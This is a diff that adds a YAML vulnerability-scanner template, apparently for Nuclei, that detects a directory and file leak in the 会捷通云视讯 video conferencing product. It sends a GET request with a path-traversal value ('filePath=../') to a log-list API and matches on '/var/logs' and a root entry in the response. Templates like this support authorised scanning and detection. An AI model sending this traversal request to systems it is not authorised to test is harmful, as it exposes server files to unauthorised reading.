@@ -1,0 +1,23 @@
+id: hui-jie-tong-list-directory-file-leak
+info:
+  name: 会捷通云视讯 list 目录文件泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - method: GET
+    path:
+      - "/him/api/rest/V1.0/system/log/list?filePath=../"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/var/logs"
+        part: body
+      - type: word
+        words:
+          - "\"name\":\"root\""
+        part: body
